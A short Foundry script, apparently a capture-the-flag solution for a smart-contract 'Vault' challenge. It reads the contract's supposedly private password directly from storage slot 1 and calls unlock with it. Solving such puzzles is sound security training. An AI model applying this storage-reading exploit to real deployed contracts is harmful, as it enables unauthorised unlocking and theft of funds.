// SPDX-License-Identifier: CC-BY-4.0
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {Vault} from "src/08/Vault.sol";


contract Exploit is Script {

        address instance = 0x6d1BEEa9eD0E145B98308DA049E371fA0C8bc923;
        Vault level = Vault(instance);        
        
        function run() external {

            vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
            
            bytes32 password = vm.load(instance, bytes32(uint256(1)));
            level.unlock(password);
            console.log(level.locked());
            
            vm.stopBroadcast();
    }
}
